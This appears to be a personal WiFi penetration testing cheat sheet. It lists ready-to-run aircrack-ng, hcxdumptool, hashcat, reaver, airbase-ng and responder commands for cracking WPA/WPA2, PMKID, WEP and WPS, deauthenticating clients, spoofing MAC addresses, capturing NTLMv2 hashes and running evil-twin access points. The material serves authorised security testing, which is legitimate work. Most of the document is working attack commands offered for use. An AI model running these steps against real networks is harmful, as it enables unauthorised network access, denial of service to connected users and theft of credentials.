# WiFi Penetration Testing Cheat Sheet

This is more of a checklist for myself. May contain useful tips and tricks.

Everything was tested on Kali Linux v2020.3 (64-bit) and WiFi Pineapple NANO with firmware v2.7.0.

For help with any of the tools write `<tool_name> -h | -hh | --help` or `man <tool_name>`.

Sometimes `-h` can be mistaken for a host or some other option. If that's the case, use `-hh` or `--help` instead, or read the manual with `man`.

Websites that you should use when writing the report:

* [cwe.mitre.org/data](https://cwe.mitre.org/data)
* [owasp.org/projects](https://owasp.org/projects)
* [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/Glossary.html)
* [nvd.nist.gov/vuln-metrics/cvss/v3-calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)

If you are interested, check my other [penetration testing cheat sheet](https://github.com/ivan-sincek/penetration-testing-cheat-sheet).

Check the most popular tool for auditing wireless networks [v1s1t0r1sh3r3/airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon).

**TO DO: Fake AP with RADIUS to crack WPA2 Enterprise.**

## Table of Contents

**1. [Configuration](#1-configuration)**

**2. [Monitoring](#2-monitoring)**

**3. [Cracking](#3-cracking)**

* [WPA/WPA2 Handshake](#wpawpa2-handshake)

* [PMKID Attack](#pmkid-attack)

* [ARP Request Replay Attack](#arp-request-replay-attack)

* [Hitre Attack](#hitre-attack)

* [WPS PIN](#wps-pin)

**4. [Wordlists](#4-wordlists)**

* [Useful Websites](#41-useful-websites)

* [SecLists](#seclists)

* [Password Spraying](#password-spraying)

**5. [Post-Exploitation](#5-post-exploitation)**

**6. [Evil-Twin](#6-evil-twin)**

## 1. Configuration

View the configuration of network interfaces:

```bash
ifconfig && iwconfig && airmon-ng
```

Turn a network interface on/off:

```fundamental
ifconfig wlan0 up

ifconfig wlan0 down
```

Restart the network manager:

```fundamental
service NetworkManager restart
```

Check the WLAN regulatory domain:

```fundamental
iw reg get
```

Set the WLAN regulatory domain:

```fundamental
iw reg set HR
```

Turn up/down a wireless network interface power (too high can be illegal in some countries):

```fundamental
iwconfig wlan0 txpower 40
```

## 2. Monitoring

Set a wireless network interface to the monitoring mode:

```bash
airmon-ng start wlan0

ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up
```

Set a wireless network interface to the monitoring mode on a specified channel:

```fundamental
airmon-ng start wlan0 8

iwconfig wlan0 channel 8
```

[Optional] Kill services that might interfere with the wireless network interfaces in the monitoring mode:

```fundamental
airmon-ng check kill
```

Set a wireless network interface back to the managed mode:

```bash
airmon-ng stop wlan0mon

ifconfig wlan0 down && iwconfig wlan0 mode managed && ifconfig wlan0 up
```

Search for WiFi networks within your range:

```fundamental
airodump-ng wlan0mon --wps -w airodump_results

wash -i wlan0mon --all
```

Monitor a specified WiFi network to capture handshakes/requests:

```fundamental
airodump-ng wlan0mon --channel 8 --bssid FF:FF:FF:FF:FF:FF --essid essid --write airodump_essid_results
```

Don't forget to stop `airodump-ng` after you are done monitoring, especially if you specified an output file, so you don't fill up all your free storage space with a big PCAP file.

Use [Kismet](https://github.com/ivan-sincek/evil-twin#additional-search-for-wifi-networks-within-your-range) or WiFi Pineapple's Recon to find more information about wireless access points, e.g. the MAC address, vendor's name, etc.

## 3. Cracking

Check if your wireless card supports packet injection:

```fundamental
aireplay-ng wlan1 --test -a FF:FF:FF:FF:FF:FF -e essid
```

### WPA/WPA2 Handshake

Monitor a specified WiFi network to capture a WPA/WPA2 4-way handshake:

```fundamental
airodump-ng wlan0mon --channel 8 --bssid FF:FF:FF:FF:FF:FF --essid essid --write airodump_essid_results
```

Deauthenticate clients from a specified WiFi network:

```fundamental
aireplay-ng wlan1 -a FF:FF:FF:FF:FF:FF -e essid --deauth 10
```

Start a dictionary attack against a WPA/WPA2 handshake:

```fundamental
aircrack-ng -b FF:FF:FF:FF:FF:FF -e essid -w rockyou.txt airodump_essid_results*.cap
```

### PMKID Attack

Crack the WPA/WPA2 authentication without deauthenticating the clients.

Install required set of tools on Kali Linux:

```bash
apt-get update && apt-get -y install hcxtools
```

\[Optional\] Install required tool on WiFi Pineapple:

```bash
opkg update && opkg -d sd install hcxdumptool
```

Start capturing PMKID hashes:

```fundamental
hcxdumptool -i wlan0mon --enable_status=1 -o hcxdumptool_results.cap
```

\[Optional\] Start capturing PMKID hashes for specified WiFi networks:

```bash
echo HH:HH:HH:HH:HH:HH | sed 's/\://g' >> filter.txt

hcxdumptool -i wlan0mon --filterlist_ap=filter.txt --filtermode=2 --enable_status=1 -o hcxdumptool_results.cap
```

Sometimes it can take hours to capture a PMKID hash.

Extract PMKID hashes from a PCAP file:

```fundamental
hcxpcaptool hcxdumptool_results.cap -k hashes.txt
```

Start a dictionary attack against PMKID hashes:

```fundamental
hashcat -m 16800 -a 0 --session=cracking --force --status --optimized-kernel-enable --outfile hashcat_results.txt hashes.txt rockyou.txt
```

Find out more about Hashcat from my other [project](https://github.com/ivan-sincek/penetration-testing-cheat-sheet#hashcat).

### ARP Request Replay Attack

If target's WiFi network is not busy, it can take days to capture enough IVs to crack the WEP authentication.

Do a fake authentication to a specified WiFi network with non-existing MAC address and keep the connection alive:

```fundamental
aireplay-ng wlan1 -a FF:FF:FF:FF:FF:FF -e essid -h FF:FF:FF:FF:FF:FF --fakeauth 6000 -o 1 -q 10
```

If MAC address filtering is active, do a fake authentication to a specified WiFi network with an existing MAC address:

```fundamental
aireplay-ng wlan1 -a FF:FF:FF:FF:FF:FF -e essid -h FF:FF:FF:FF:FF:FF --fakeauth 0
```

To monitor the number of captured IVs, run `airodump-ng` against a specified WiFi network and watch the `#Data` column (try to capture around 100k IVs):

```fundamental
airodump-ng wlan0mon --channel 8 --bssid FF:FF:FF:FF:FF:FF --essid essid --write airodump_essid_results
```

Start a standard ARP request replaying against a specified WiFi network:

```fundamental
aireplay-ng wlan1 -a FF:FF:FF:FF:FF:FF -e essid -h FF:FF:FF:FF:FF:FF --arpreplay
```

[Optional] Deauthenticate clients from a specified WiFi network:

```fundamental
aireplay-ng wlan1 -a FF:FF:FF:FF:FF:FF -e essid --deauth 10
```

Crack the WEP authentication:

```fundamental
aircrack-ng -b FF:FF:FF:FF:FF:FF -e essid replay_arp*.cap
```

### Hitre Attack

This attack targets clients, not wireless access points. You must know the SSID of your target WiFi.

[Optional] Set up a fake WEP WiFi network if the real one is not present:

```fundamental
airbase-ng wlan0mon -c 8 -a FF:FF:FF:FF:FF:FF --essid essid -W 1 -N
```

If needed, turn up a wireless network interface power to missassociate clients to the fake WiFi network, see how in [section one](#1-configuration).

Monitor the real/fake WiFi network to capture handshakes/requests:

```fundamental
airodump-ng wlan0mon --channel 8 --bssid FF:FF:FF:FF:FF:FF --essid essid --write airodump_essid_results
```

Start replaying packets to clients within your range:

```fundamental
aireplay-ng wlan1 -h FF:FF:FF:FF:FF:FF -e essid --cfrag -D
```

[Optional] Deauthenticate clients from the real/fake WiFi network:

```fundamental
aireplay-ng wlan1 -a FF:FF:FF:FF:FF:FF -e essid --deauth 10
```

Crack the WEP authentication:

```fundamental
aircrack-ng -b FF:FF:FF:FF:FF:FF -e essid airodump_essid_results*.cap
```

### WPS PIN

Crack a WPS PIN:

```fundamental
reaver -vv -i wlan1 -c 8 -b FF:FF:FF:FF:FF:FF -e essid --pixie-dust
```

Crack a WPS PIN with some delay between attempts:

```fundamental
reaver -vv -i wlan1 -c 8 -b FF:FF:FF:FF:FF:FF -e essid --pixie-dust -N -L -d 5 -r 3:15 -T 0.5
```

## 4. Wordlists

You can find `rockyou.txt` wordlist located at `/usr/share/wordlists/` directory or download it from my other [project](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/dict).

### 4.1 Useful Websites

[weakpass.com/wordlist](https://weakpass.com/wordlist)

### SecLists

Download a useful collection of multiple types of lists for security assessments.

Installation:

```fundamental
apt-get install seclists
```

Lists will be stored at `/usr/share/seclists/`.

Or, download the collection manually from [here](https://github.com/danielmiessler/SecLists/releases).

### Password Spraying

Find out how to generate a good password spraying wordlist from my other [project](https://github.com/ivan-sincek/wordlist-extender), but first you will need a few good keywords that describe your target.

Such keywords can be a company name and abbreviation or keywords that describe your target's services, products, etc.

After you generate the wordlist, use it with tool such as `aircrack-ng` to crack WPA/WPA2 handshakes.

If strong password policy is enforced, passwords usually start with one capitalized word followed by few digits and one special character at the end (e.g. Password123!).

You can also use the generated wordlist with [Hashcat](https://github.com/ivan-sincek/penetration-testing-cheat-sheet#hashcat), e.g. to crack NTLMv2 hashes that you have collected using LLMNR responder, etc.

## 5. Post-Exploitation

If MAC address filtering is active, change your wireless card's MAC address to an existing one:

```fundamental
ifconfig wlan0 down && macchanger --mac FF:FF:FF:FF:FF:FF && ifconfig wlan0 up
```

Once you get an access to a WiFi network, run the following tools:

```fundamental
yersinia -G

responder -I 192.168.5.10 -wF

wireshark
```

Find out how to pipe WiFi Pineapple's `tcpdump` directly into the Wireshark from my other [poject](https://github.com/ivan-sincek/evil-twin#additional-sniff-wifi-network-traffic).

Try to access a wireless access point's web interface. Search the Internet for default credentials.

Start scanning/enumerating the network.

## 6. Evil-Twin

Find out how to set up a fake authentication web page on a fake WiFi network with WiFi Pineapple Mark VII Basic from my other [project](https://github.com/ivan-sincek/evil-twin), as well as how to set up all the tools from this cheat sheet.
